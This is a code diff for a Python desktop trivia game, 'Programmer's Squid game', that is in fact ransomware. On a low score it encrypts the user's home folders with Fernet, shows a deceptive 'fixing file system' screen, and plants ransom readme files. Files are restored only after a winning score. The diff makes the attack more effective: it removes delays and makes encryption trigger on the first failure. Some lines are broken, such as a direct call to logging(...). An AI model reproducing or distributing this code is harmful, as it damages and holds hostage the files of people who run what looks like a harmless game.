@@ -1,16 +1,17 @@
 import json
 import os
-import time
+import logging
 import customtkinter as ctk
 
 from cryptography.fernet import Fernet
 from tkinter import PhotoImage
 
+
 ########## Welcome to Programmer's Squid game ##########
 # welcome_text = pyfiglet.figlet_format(" Programmer's Squid game.")
 welcome_text = "Programmer's Squid game"
 # Load data
-with open("data.json", "r") as f:
+with open("data/data.json", "r") as f:
     data = json.load(f)
 
 ctk.set_appearance_mode("dark")
@@ -34,19 +35,20 @@ class Attack:
         """
 
         try:
-            print(directory)
+            logging.info(f"{directory}")
             for file in os.listdir(directory):
-                print(file)
+                logging.info(f"{file}")
                 path = os.path.join(directory, file)
                 if os.path.isdir(path):
                     self.list_files(path)
                 elif os.path.isfile(path):
                     if file not in ["readme.txt", "thekey.key"]:
-                        # if os.path.getsize(path + "/" + file) <= 1048576:
-                        self.files.add(path)
+                        if os.path.getsize(path) <= 1048576:
+                            self.files.add(path)
                 
-        except Exception as e:
-            print(f"Error listing files in directory {directory}: {e}")
+        except Exception:
+            logging.exception(f"Error listing files in directory {directory}")
+            pass
 
     def generate_key(self):
         """
@@ -57,10 +59,11 @@ class Attack:
             IOError: If there is an error writing to 'data.json'.
         """
 
-        print("Generating key...")
+        logging.info("Generating key...")
         self.key = Fernet.generate_key()
+        logging.info(f"{self.key}")
         data["key"] = str(self.key)
-        with open('data.json', 'w') as file:
+        with open('data/data.json', 'w') as file:
             json.dump(data, file, indent=4)
 
     def encrypt_files(self, frame = None, master=None):
@@ -84,27 +87,27 @@ class Attack:
         # List all the files in the folders
         for folder in data["folders"]:
             self.list_files(os.path.join(os.path.expanduser("~"), folder))
-        print(len(self.files), " files found.")
+        logging.info(f"{len(self.files)} files found.")
 
         # Encrypt the files
         for index, file in enumerate(self.files):
-            print("Encrypting file: ", file)
+            logging.info(f"Encrypting file: {file}")
             try:
                 with open(file, "rb") as f:
                     contents = f.read()
                     contents_encrypted = Fernet(self.key).encrypt(contents)
                 with open(file, "wb") as f:
                     f.write(contents_encrypted)
-                print("File encrypted successfully.")
+                logging.info("File encrypted successfully.")
             except Exception:
-                print(f"Error encrypting file {file}: {e}")
+                logging(f"Error encrypting file {file}")
+                continue
             
             # Update the progress bar
             if frame:
                 progress = (index + 1) / len(self.files)
                 frame.progressbar.set(progress)
                 master.update_idletasks()
-            time.sleep(5)
             if index+1 == len(self.files):
                 frame.summary.configure(text="All done!", font=ctk.CTkFont(size=20), text_color="green")
                 frame.next_button.grid(padx=20, pady=(0, 40), sticky="n")
@@ -122,9 +125,9 @@ class Attack:
             try:
                 with open(os.path.expanduser("~") + "/" + path + "/" + "readme.txt", "w") as f:
                     f.write(data["readme_context"])
-                print("Creating readme file in ", os.path.expanduser("~") + path)
-            except Exception as e:
-                print(e)
+                logging.info(f"Creating readme file in {os.path.expanduser("~") + path}")
+            except Exception:
+                logging.exception("Error creating readme file")
                 continue
     
     def decrypt_files(self, frame=None, master=None):
@@ -150,22 +153,21 @@ class Attack:
 
         # Decrypt the files
         for index, file in enumerate(self.files):
-            print("Decrypting file: ", file)
+            logging.info(f"Decrypting file: {file}")
             try:
                 with open(file, "rb") as f:
                     contents = f.read()
                     contents_decrypted = Fernet(key).decrypt(contents)
                 with open(file, "wb") as f:
                     f.write(contents_decrypted)
-                print("File decrypted successfully.")
-            except Exception as e:
-                print(f"Error decrypting file {file}: {e}")
+                logging.info("File decrypted successfully.")
+            except Exception:
+                logging.exception(f"Error decrypting file {file}")
                 continue
             if frame:
                 progress = (index + 1) / len(self.files)
                 frame.progressbar.set(progress)
                 master.update_idletasks()
-            time.sleep(5)
             if index+1 == len(self.files):
                 frame.summary.configure(text="All done!", font=ctk.CTkFont(size=20), text_color="green", justify="center")
                 frame.next_button.grid(padx=20, pady=(0, 40), sticky="n")
@@ -181,17 +183,17 @@ class Attack:
         for path in data["folders"]:
             try:
                 os.remove(os.path.expanduser("~") + "/" + path + "/" + "readme.txt")
-                print("Removing readme file in ", path)
-            except Exception as e:
-                print(e)
+                logging.info(f"Removing readme file in {path}")
+            except Exception:
+                logging.exception("Error removing readme file")
                 continue
             try:
                 data["key"] = None
-                with open('data.json', 'w') as file:
+                with open('data/data.json', 'w') as file:
                     json.dump(data, file, indent=4)
-                print("Deleting key...")
-            except Exception as e:
-                print(e)
+                logging.info("Deleting key...")
+            except Exception:
+                logging.exception("Error removing key")
                 continue
 
 class WelcomeFrame(ctk.CTkFrame):
@@ -273,7 +275,7 @@ class TriviaFrame(ctk.CTkFrame):
         self.grid_rowconfigure(1, weight=1)
         self.grid_columnconfigure(0, weight=1)
 
-        self.score = 0
+        self.score = 20
         self._data = data
         self._qtn_num = 1
 
@@ -312,25 +314,46 @@ class TriviaFrame(ctk.CTkFrame):
             self._qtn_num += 1
         else:
             if self.score < 18:
-                if data["key"]:
-                    print("You failed the game. You will be attacked by ransomware.")
-                    print("Your files will be encrypted.")
-                    print("Read the readme.txt file in each folder to get the instructions. eng Downloads and Documents folder")
+                if not data["key"]:
+                    logging.info("You failed the game. You will be attacked by ransomware.")
+                    logging.info("Your files will be encrypted.")
+                    logging.info("Read the readme.txt file in each folder to get the instructions. eng Downloads and Documents folder")
                     frame = self.master.show_frame(self, self.master.loader_screen, title="OPPS", summary="Don't close the window as the application is solving issues with its file system, please give a bit time")  # Show the encrypt screen first
                     self.master.update_idletasks()  # Ensure the screen is updated
                     Attack().encrypt_files(frame, self.master)
-                # else:
-                #     print("Your files will stay encrypted untill you get the wanted score.")
-                #     time.sleep(5)
-                #     self.master.show_frame(self.master.trivia_frame)
+                else:
+                    logging.info("Your files will stay encrypted untill you get the wanted score.")
+                    self.master.show_frame(
+                        self,
+                        self.master.notice_screen, 
+                        title="Files Already Encrypted!", 
+                        summary=(
+                            f"Affected folders: {', '.join(data['folders'])}.\n\n"
+                            "Your files are already encrypted due to not scoring the desired score of 18. "
+                            "Please play the game again and achieve the required marks to decrypt your files. "
+                            "Do not tamper with the files in the affected folders as they might not be able to be decrypted. "
+                            "For more information, read the 'readme.txt' file in the affected folders."
+                        )
+                    )
             else:
-                print("You won the game. Congratulations!")
-                print("You will be rewarded with 1 million dollars.")
+                logging.info("You won the game. Congratulations!")
+                logging.info("You will be rewarded with 1 million dollars.")
                 if data["key"]:
                     frame = self.master.show_frame(self, self.master.loader_screen, title="Decrypting affected files.", summary="Please don't close the window or interfere with the affected files as this might conflict the decryption process.")  # Show the encrypt screen first
                     self.master.update_idletasks()  # Ensure the screen is updated
                     Attack().decrypt_files(frame, self.master)
-                    print("Your files have been decrypted.") 
+                    logging.info("Your files have been decrypted.")
+                else:
+                    self.master.show_frame(
+                        self,
+                        self.master.notice_screen, 
+                        title="Congratulations!", 
+                        summary=(
+                            "You have achieved the desired score and won the game! "
+                            "Your files were never encrypted. "
+                            "Enjoy your victory and the reward of 1 million dollars!"
+                        )
+                    )
         
         self.scores.configure(text=f"Score: {self.score}")
         self.progress_text.configure(text=f"{self._qtn_num}/{len(self._data)}")
@@ -355,7 +378,7 @@ class App(ctk.CTk):
         self.geometry("600x600")
         self.grid_rowconfigure(0, weight=1)  # configure grid system
         self.grid_columnconfigure(0, weight=1)
-        icon = PhotoImage(file="thinking.png")
+        icon = PhotoImage(file="data/thinking.png")
         self.iconphoto(False, icon)
 
         self.welcome_screen = WelcomeFrame(self)
@@ -371,7 +394,7 @@ class App(ctk.CTk):
         self.show_frame(None, self.welcome_screen)
 
     def show_frame(self, forget_frame, frame, **kwargs):
-        print(f"Changing frame to {frame}")
+        logging.info(f"Changing frame to {frame}")
         if forget_frame:
             forget_frame.grid_forget()
 
@@ -395,16 +418,17 @@ class App(ctk.CTk):
 
 
 if __name__ == "__main__":
+    logging.basicConfig(
+    filename="data/squidgamelog.log",
+    encoding="utf-8",
+    filemode="a",
+    format="{asctime} - {levelname} - {message}",
+    style="{",
+    datefmt="%Y-%m-%d %H:%M",
+    level=logging.INFO
+)
+
+    logging.info("Starting Application...")
     app = App()
     app.mainloop()
-
-
-
-######## ERROS TO FIX #########
-# Questions repeating 
-# Options for the question on static and dynamic variables
-
-######### ADD ons #############
-# Notice message part
-# logging results
-# Notice frames
+    logging.info("Closing Application")
